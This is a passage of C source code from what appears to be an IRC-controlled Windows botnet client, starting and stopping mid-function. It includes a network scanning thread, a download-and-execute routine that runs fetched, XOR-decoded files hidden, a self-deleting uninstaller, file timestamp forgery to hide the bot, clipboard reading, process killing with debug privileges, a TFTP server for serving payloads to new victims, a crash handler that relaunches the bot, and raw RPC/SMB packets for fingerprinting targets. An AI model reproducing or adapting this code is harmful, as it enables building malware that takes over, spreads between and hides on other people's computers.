		strncpy(threads[scan.threadnum].name, str, sizeof(threads[scan.threadnum].name)-1);
		if (th = CreateThread(NULL, 0, &ScanConnectThread, (LPVOID)&scan, 0, &id)) {
			while(scan.cgotinfo == FALSE)
				Sleep(50);
		}
		CloseHandle(th);
		scans->cgotinfo = FALSE;
		Sleep(scans->delay);
		memcpy(&host, &scan.addy, 4);
		host = fntohl(host);
		host += 1;
		host = fhtonl(host);
		memcpy(&scan.addy, &host, 4);
	}
	clearthread(scan.threadnum);

	return 0;
 }
#endif

#ifndef NO_DOWNLOAD

// function for downloading files/updating
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;

	DOWNLOAD dl = *((DOWNLOAD *)param);
	DOWNLOAD *dls = (DOWNLOAD *)param;
	dls->gotinfo = TRUE;

	HANDLE fh = fInternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {
		// open the file
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			sprintf(buffer,"%s Couldn't open file: %s",mn_title,dl.dest);
			if (!dl.silent) irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
			//////addlog(sendbuf)

			clearthread(dl.threadnum);

			ExitThread(0);;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIX ME: Only checks first 500 kb
		do {
			memset(buffer, 0, sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			if (dl.encrypted)
				Xorbuff(buffer,r);
			WriteFile(f, buffer, r, &d, NULL);
			
			if ((total) < 512000) {
				//We have free bytes...
				//512000-total
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
			if (dl.filelen) 
				if (total>dl.filelen) 
					break; //er, we have a problem... filesize is too big.
			if (dl.update != 1) 
				sprintf(threads[dl.threadnum].name, "%s File download: %s (%dKB transferred)", mn_title, dl.url, total / 1024);
			else 
				sprintf(threads[dl.threadnum].name, "%s Update: %s (%dKB transferred)", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(buffer,"%s Filesize is incorrect: (%d != %d).", mn_title, total, dl.filelen);
				irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
				//////addlog(sendbuf)
			}
		}
		speed = total / (((GetTickCount() - start) / 1000) + 1);
		CloseHandle(f);

		free(fileTotBuff);
		
		if (dl.expectedcrc) { 
			unsigned long crc=crc32f(dl.dest); 
			if (crc!=dl.expectedcrc) { 
				goodfile=FALSE;
				sprintf(buffer,"%s CRC Failed (%d != %d)", mn_title, crc, dl.expectedcrc);
				irc_privmsg(dl.sock, dl.chan, buffer, dl.notice); 
				//////addlog(sendbuf)
			} 
		} 

		if (goodfile==FALSE) 
			goto badfile;
		
		//download isn't an update
		if (dl.update != 1) {
			sprintf(buffer, "%s Downloaded %.1f KB to %s @ %.1f KB/sec.", mn_title, total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			//////addlog(sendbuf)

			if (dl.run == 1) {
				fShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(buffer,"%s Opened: %s ",mn_title,dl.dest);
					irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
				//	////addlog(sendbuf)
				}
			}

		// download is an update
		} else {
			sprintf(buffer, "%s Downloaded %.1fKB to %s @ %.1fKB/sec. Updating", mn_title, total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			////addlog(sendbuf)

			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;

			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			} else {
				sprintf(buffer,"%s Update failed: Error executing file: %s",mn_title, dl.dest);
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
				////addlog(sendbuf)
			}
		}
	} else {
		sprintf(buffer,"%s Bad URL, or DNS Error: %s",mn_title, dl.url);
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
		////addlog(sendbuf)
	}

	badfile:
	fInternetCloseHandle(fh);

	clearthread(dl.threadnum);

	ExitThread(0);
}

char *Xorbuff(char *buffer,int bufferLen)
{
	for (int i=0;i<bufferLen;i++)
		buffer[i]^=prefix;

	return (buffer);
}
#endif

// globals
extern char tempdir[256];      // name of temp folder

char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty 
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string 
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found 
			strncpy(temps, str, ptr - str);     // Copy first part 
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

// This will change x0A & x0D into x00 and return line pointers in saveArray[].
int Split(char *inStr, void *saveArray)
{
	int i,j,index=0;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;

	lines[index++]=inStr;
	for (i=0;i < j;i++) 
		if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D')) 
			inStr[i]='\x0';

	//Now that all cr/lf have been converted to NULL, save the pointers...
	for (i=0;i < j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			if (index < MAX_LINES) 
				lines[index++] = &inStr[i+1]; 
			else 
				break;
		}
	}

	if (saveArray!=0) 
		memcpy(saveArray,lines,sizeof(lines));

	return index;
}

void initskip(char *s, int len, int skip[1024])
{
	int i, j;

	for (i = 0; i < MAXSTRLEN; i++)
		skip[i] = len;
	for (j = 0; j <= len - 1; j++)
		skip[lstrindex(s[j])] = len - j - 1;

	return;
}

int lstrindex(char c)
{
	char d = tolower(c);

	if (d >= 'a' && d <= 'z')
		return (d - 'a' + 1);
	else
		return 0;
}

char *lstrstr(char *s, char *t)
{
	int i, j, k, slen=strlen(s), tlen=strlen(t);
	int skip[1024];

	initskip(t, tlen, skip);

	for (i = j = tlen - 1; j > 0; i--, j--) {
		while (tolower(s[i]) != tolower(t[j])) {
			k = skip[lstrindex(s[i])];
			i += (tlen - j > k) ? tlen - j : k;
			if (i >= slen)
				return NULL;
			j = tlen - 1;
		}
	}
	return (s + i);
}

char *PrintError(char *msg)
{
	TCHAR sysMsg[256];
	static char buffer[IRCLINE];

	DWORD err = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), sysMsg, 256, NULL);

	TCHAR *p = sysMsg;
	while((*p > 31) || (*p == 9))
		++p;
	do
		*p-- = 0; 
	while((p >= sysMsg) && ((*p == '.') || (*p < 33)));

	_snprintf(buffer,sizeof(buffer),"%s Error: %s <%d>.",msg,sysMsg,err);

	return (buffer);
}

char *GetClipboardText(void) 
{
	if (fOpenClipboard(NULL)) {
		HANDLE hData = fGetClipboardData(CF_TEXT);
		if (!hData) 
			return 0;
		char * buffer = (char*)GlobalLock(hData);

		GlobalUnlock(hData);
		fCloseClipboard();

		return buffer;
	}

	return 0;
}

void SetFileTime(char *Filename)
{
	FILETIME aFileTime, bFileTime, cFileTime;

	char exepath[MAX_PATH];
	if(fSearchPath(NULL,"explorer.exe",NULL,sizeof(exepath),exepath,NULL) == 0)
		return;  

	HANDLE hTimeFile = CreateFile(exepath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);

		hTimeFile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hTimeFile != INVALID_HANDLE_VALUE) {
			SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
			CloseHandle(hTimeFile);
		}
	}

	return;
}

DWORD CreateProc(char *file, char *param)
{	
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo); 
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE;

	char cmdline[1024];
	_snprintf(cmdline,sizeof(cmdline),"%s %s",file, param);

	if (CreateProcess(file, cmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == 0)
		return 0; 

	return (pinfo.dwProcessId); 
}

void uninstall(void)
{
	char buffer[1024], cmdline[MAX_PATH], botfile[MAX_PATH], batfile[MAX_PATH];

	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs();

	killthreadall();
	
	GetTempPath(sizeof(buffer), buffer);
	sprintf(batfile, "%sdel.bat", buffer);
	HANDLE f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		DWORD r;

		sprintf(buffer,"@echo off\r\n"
					":repeat\r\n"
					"del \"%%1\"\r\n"
					"if exist \"%%1\" goto repeat\r\n"
					"del \"%s\"", batfile);
		WriteFile(f, buffer, strlen(buffer), &r, NULL);
		CloseHandle(f);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), botfile, sizeof(botfile));
		if (GetFileAttributes(botfile) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(botfile,FILE_ATTRIBUTE_NORMAL);
		sprintf(buffer, "%%comspec%% /c %s %s", batfile, botfile);
		ExpandEnvironmentStrings(buffer, cmdline, sizeof(cmdline));

		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, BELOW_NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
	
	return;
}
int randnum(int range) {
	srand(GetTickCount());
	return (rand() % range);
}

// globals
extern FILE *fp;

// irc send functions
void irc_sendv(SOCKET sock, char *msg, ...)
{
	char msgbuf[IRCLINE];

	va_list argp;
	va_start(argp, msg); 
	_vsnprintf(msgbuf, sizeof(msgbuf), msg, argp);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
#endif

	return;
}

void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay)
{
	char msgbuf[IRCLINE], tmpbuf[IRCLINE], *action;

	if (notice) 
		action = "NOTICE"; 
	else 
		action = "PRIVMSG";

	int bufsize = IRCLINE - strlen(action) - strlen(dest) - 6 ; // trust me
	_snprintf(tmpbuf,bufsize,"%s",msg);
	sprintf(msgbuf,"%s %s :%s\r\n", action, dest, tmpbuf);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
#endif

	if(delay)
		Sleep(FLOOD_DELAY);

	return;
}

#ifndef NO_EHANDLER

// globals
DWORD scratch;

EXCEPTION_DISPOSITION cdecl _except_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
	void *EstablisherFrame,struct _CONTEXT *ContextRecord,void *DispatcherContext)
{	

	fclosesocket(threads[0].sock);
	killthreadall();
	fWSACleanup();
	fWSACleanup();
	Sleep(100);
	
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
#ifdef DEBUG_CONSOLE
	sinfo.wShowWindow = SW_SHOW;
#else
	sinfo.wShowWindow = SW_HIDE;
#endif
		
	char botfile[MAX_PATH],sysdir[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(NULL, botfile, sizeof(botfile));

	if (CreateProcess(NULL, botfile, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
		Sleep(100);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}

	ContextRecord->Eax = (DWORD)&scratch;

	_asm
	{                           // Remove our EXECEPTION_REGISTRATION record
		mov     eax,[ESP]       // Get pointer to previous record
		mov     FS:[0], EAX     // Install previous record
		add     esp, 8          // Clean our EXECEPTION_REGISTRATION off stack
	}

	ExitProcess(0);

	return ExceptionContinueExecution;
}
#endif


BOOL PrivateIP(const char *ip)
{	
	if (ip) {
		if (strcmp(ip, "") != 0) {
			char *token, ipbuf[32]; 	
			strncpy(ipbuf, ip, sizeof(ipbuf)); 
			if ((token=strtok(ipbuf, ".")) != NULL) { 
				int ip1 = atoi(token);
				if ((token=strtok(NULL, ".")) != NULL) {
					int ip2 = atoi(token);

					if ((ip1 == 10)	
						|| (ip1 == 172 && ip2 > 15 && ip2 < 32)	
						|| (ip1 == 192 && ip2 == 168))
						return TRUE;
				}
			}
		}
	}
	return FALSE; 
}


unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(szHost);
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
}

BOOL FlushDNSCache(void)
{
	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet = fDnsFlushResolverCache();

	return (bRet);
}

BOOL FlushARPCache(void)
{
    char logbuf[LOGLINE];
    PMIB_IPNETTABLE arp = 0;
    ULONG tsize = 0;
	BOOL bRet = TRUE;
	
    DWORD result = fGetIpNetTable(NULL, &tsize, TRUE);
	switch(result) {
	case ERROR_SUCCESS:
		break;
	case ERROR_INSUFFICIENT_BUFFER:
		arp=(PMIB_IPNETTABLE)malloc(tsize);
		memset((LPVOID)arp, 0, tsize);

		if (arp != NULL) {
			if ((result = fGetIpNetTable(arp, &tsize, TRUE)) != ERROR_SUCCESS) {
				sprintf(logbuf,"%s Error getting ARP cache  %d ",mn_title,result);
				bRet = FALSE;
			}
		} else {
			sprintf(logbuf,"%s Unable to allocation ARP cache",mn_title);
			bRet = FALSE;
		}
		break;
	case ERROR_NO_DATA:
		sprintf(logbuf,"%s ARP cache is empty",mn_title);
		bRet = FALSE;
		break;
	case ERROR_NOT_SUPPORTED:
		sprintf(logbuf,"%s Not supported by this system",mn_title);
		bRet = FALSE;
		break;
	default:
		sprintf(logbuf,"%s Error getting ARP cache %d",mn_title,result);
		bRet = FALSE;
	}

	if (bRet) {
	    for (unsigned int i = 0; i < arp->dwNumEntries; i++)
			fDeleteIpNetEntry(&arp->table[i]);
	} else
		//addlog(logbuf);
	free(arp);

	return (bRet);
}

char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	fgetsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

// Standard TCP/UDP checksum function.
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }

    if (size)
        cksum += *(UCHAR*)buffer;   

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

unsigned short in_cksum(unsigned short *addr,int len)
{
	register int sum = 0;
	unsigned short answer = 0;
	register unsigned short *w = addr;
	register int nleft = len;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	sum += (sum >> 16);                     /* add carry */
	answer = ~sum;                          /* truncate to 16 bits */
	return(answer);
}


BOOL FileExists(char *filename, int mode) 
{ 
	return (_access(filename, mode) != -1);
} 

const char *commaI64(unsigned __int64 number)
{
	const int size = 50;
	int counter = 0;

	static char str[size];
	memset(str, 0, sizeof(str));

	char tempStr[size];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return (str);
}


BOOL AdjustPrivileges(char *pPriv, BOOL add)
{
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!fOpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		return bRet;

	if (!fLookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1; 
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else 
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet=fAdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);
	
	CloseHandle(hToken);

	return bRet;
}

int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread, BOOL full)
{
	char sendbuf[IRCLINE];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = {0};
	MODULEENTRY32 me32 = {0};
	
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		AdjustPrivileges(SE_DEBUG_NAME, TRUE);
		if ((hProcess = fCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hProcess, &pe32)) {
				while (fProcess32Next(hProcess, &pe32)) {
					if (killthread) {
						
					}
					else if (!proccess) {
						if (chan) {
							hProcess2 = fCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
							me32.dwSize = sizeof(MODULEENTRY32);
							if (full) {
								if (fModule32First(hProcess2, &me32))
									sprintf(sendbuf," %s (%d)",me32.szExePath,pe32.th32ProcessID);
								else
									sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							} else
								sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							irc_privmsg(sock,chan,sendbuf,notice,TRUE);
							CloseHandle(hProcess2);
						}
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							hProcess2 = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hProcess);

							if (!TerminateProcess(hProcess2,0)) {
								CloseHandle(hProcess2);

								return 0;
							}
							return 1;
						 }
					}
				} 
			}
			CloseHandle(hProcess);
		}
		AdjustPrivileges(SE_DEBUG_NAME, FALSE);
	}

 	return 0;
}

DWORD WINAPI listProcessesThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	LPROC lproc = *((LPROC *)param);
	LPROC *lprocp = (LPROC *)param;
	lprocp->gotinfo = TRUE;

	sprintf(sendbuf,"%s Listing processes:",mn_title);
	if (!lproc.silent) irc_privmsg(lproc.sock,lproc.chan,sendbuf,lproc.notice);
	
	if (listProcesses(lproc.sock,lproc.chan,lproc.notice,NULL, FALSE, lproc.full) == 0)
		sprintf(sendbuf,"%s Process list completed",mn_title);
	else 
		sprintf(sendbuf,"%s Process list failed",mn_title);

	if (!lproc.silent) irc_privmsg(lproc.sock, lproc.chan, sendbuf, lproc.notice);
	////addlog(sendbuf);

	clearthread(lproc.threadnum);

	ExitThread(0);
}

int killProcess(int pid)
{
	int ret=1;

 	HANDLE pHandle;
	
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) != NULL)
		if(!TerminateProcess(pHandle,0)) {
			ret=0;
			CloseHandle(pHandle);
		}

	return ret;
}

#ifndef NO_TFTPD

DWORD WINAPI tftpserver(LPVOID param) 
{ 
	FILE *fp;

	char sendbuf[IRCLINE], buffer[128], type[]="octet", IP[18];
	int err=1; 

	TFTP tftp = *((TFTP *)param);
	TFTP *tftps = (TFTP *)param;
	tftps->gotinfo = TRUE;
	tftp.threads++; 

	SOCKET ssock;
	if ((ssock=fsocket(AF_INET,SOCK_DGRAM,0)) == INVALID_SOCKET) {
		Sleep(400);
		sprintf(sendbuf,"%s Error: socket() failed, returned: %d", rt_title,fWSAGetLastError());
		if (!tftp.silent) irc_privmsg(tftp.sock,tftp.chan,sendbuf,tftp.notice);
		////addlog(sendbuf);

		clearthread(tftp.threadnum);

		ExitThread(0);
	}
	threads[tftp.threadnum].sock=ssock;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET; 
	ssin.sin_port = fhtons((unsigned short)tftp.port); 
	ssin.sin_addr.s_addr = INADDR_ANY; 

	if((fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin))) == SOCKET_ERROR) { 
		Sleep(5000); 
		tftp.threads--; 

		return tftpserver(param); 
	} 

	if ((fp=fopen(tftp.filename, "rb")) == NULL) {
		Sleep(400);

		clearthread(tftp.threadnum);

		ExitThread(0);
	}

	while(err>0 && tftps->gotinfo && fp) { 
		TIMEVAL timeout; 
		timeout.tv_sec=5; 
		timeout.tv_usec=5000; 

		fd_set fd; 
		FD_ZERO(&fd); 
		FD_SET(ssock,&fd); 

		memset(buffer,0,sizeof(buffer)); 
		if(fselect(0,&fd,NULL,NULL,&timeout) > 0) { 
			SOCKADDR_IN csin;
			int csin_len=sizeof(csin); 
			char f_buffer[BLOCKSIZE+4]=""; 
			
			err=frecvfrom(ssock, buffer, sizeof(buffer), 0, (LPSOCKADDR)&csin, &csin_len); 
			sprintf(IP,finet_ntoa(csin.sin_addr));
        
			// parse buffer
			if(buffer[0]==0 && buffer[1]==1) { //RRQ
				char *tmprequest=buffer,*tmptype=buffer;
				tmprequest+=2; //skip the opcode
				tmptype+=(strlen(tftp.requestname)+3); //skip the opcode and request name + NULL
				if(strncmp(tftp.requestname,tmprequest,strlen(tftp.requestname)) != 0||strncmp(type,tmptype,strlen(type)) != 0) { 
					fsendto(ssock, "\x00\x05\x00\x01\x46\x69\x6C\x65\x20\x4E\x6F\x74\x20\x46\x6F\x75\x6E\x64\x00", 19, 0, (LPSOCKADDR)&csin,csin_len);
				} else { // good rrq packet send first data packet 
					fseek(fp, 0, SEEK_SET); 
					f_buffer[0]=0; f_buffer[1]=3; // DATA
					f_buffer[2]=0; f_buffer[3]=1; // DATA BLOCK #
					err=fread(&f_buffer[4], 1, BLOCKSIZE, fp); 
					fsendto(ssock, f_buffer, err + 4, 0, (LPSOCKADDR)&csin, csin_len);

				} 
			} else if(buffer[0]==0 && buffer[1]==4) { // ACK 
				// send next packet 
				unsigned int blocks; 
				BYTE b1=buffer[2],b2=buffer[3]; // ACK BLOCK #

				f_buffer[0]=0; f_buffer[1]=3;	// DATA
				if (b2==255) {					// DATA BLOCK #
					f_buffer[2]=++b1;
					f_buffer[3]=b2=0;
				} else {
					f_buffer[2]=b1;
					f_buffer[3]=++b2;
				}

				blocks=(b1 * 256) + b2 - 1; 
				// remember to subtract 1 as the ACK block # is 1 more than the actual file block #
				fseek(fp, blocks * BLOCKSIZE, SEEK_SET); 
				err=fread(&f_buffer[4], 1, BLOCKSIZE, fp); 
				fsendto(ssock, f_buffer, err + 4, 0, (LPSOCKADDR)&csin, csin_len);
				if (err==0) {
					sprintf(sendbuf,"%s Transfer Complete On %s Executing ::(9 %s )::",rt_title,IP,filename);
					if (!tftp.silent) irc_privmsg(tftp.sock,tftp.chan,sendbuf,tftp.notice);
					////addlog(sendbuf);
				}
			} else { // we dont support any other commands 
				fsendto(ssock, "\x00\x05\x00\x04\x6B\x74\x68\x78\x00",9, 0, (LPSOCKADDR)&csin, csin_len); 
			} 
		} else 
			continue;
	} 
	// check for ack, then msg irc on transfer complete

	fclosesocket(ssock); 
	fclose(fp); 

	tftp.threads--; 
	if(tftps->gotinfo == FALSE) {
		clearthread(tftp.threadnum);

		ExitThread(0); 
	}
	Sleep(1000);
   
	return tftpserver(param); 
} 
#endif

char rpcfp_bindstr[]=
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";

char sessionrequest[]=
	"\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45\x4e\x45\x43\x46\x44\x45"
	"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x00\x20\x45\x4b\x45\x44\x46\x45\x45\x49\x45"
	"\x44\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x41\x41\x00";

char negotiate[]=
	"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
	"\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e"
	"\x31\x32\x00";

char setupaccount[]=
	"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
	"\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff\xff\x02\x00\x5c\x02\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0b"
	"\x00\x00\x00\x6e\x74\00\x70\x79\x73\x6d\x62\x00";


bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{
	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;

	return false;
}

int FpHost(const char *szHost, int iFpType)
{
	switch(iFpType) {
	case FP_RPC:
		{
			char szRecvBuf[8192];
	    
			int iRetVal=OS_UNKNOWN;
			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;
	    
			SOCKADDR_IN ssin; 
			ZeroMemory(&ssin, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(135); 
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);
	    
			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {	
				iErr=fsend(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				if(szRecvBuf[2]==DCE_PKT_BINDACK) {	
					iErr=fsend(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1,0);
